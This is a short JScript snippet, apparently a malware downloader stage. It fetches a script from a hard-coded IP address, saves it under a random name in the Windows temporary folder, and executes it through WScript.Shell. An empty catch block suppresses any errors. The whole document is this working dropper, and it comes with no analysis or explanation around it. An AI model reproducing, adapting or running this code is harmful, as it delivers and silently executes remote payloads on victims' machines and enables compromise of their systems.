``` javascript
try {
    var Object = new ActiveXObject("MSXML2.XMLHTTP");
    Object.Open("GET", "http://192.3.220.6/web/w88.js", false);
    Object.Send();
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var filepath = fso.GetSpecialFolder(2) + "/OPXCFY.js";
    if (Object.Status == 200) {
        var Stream = new ActiveXObject("ADODB.Stream");
        Stream.Open();
        Stream.Type = 1;
        Stream.Write(Object.ResponseBody);
        Stream.Position = 0;
        Stream.SaveToFile(filepath, 2);
        Stream.Close();
        var WshShell = new ActiveXObject("WScript.Shell");
        var oRUN = WshShell.Run(filepath);
    }
} catch (e) {}
```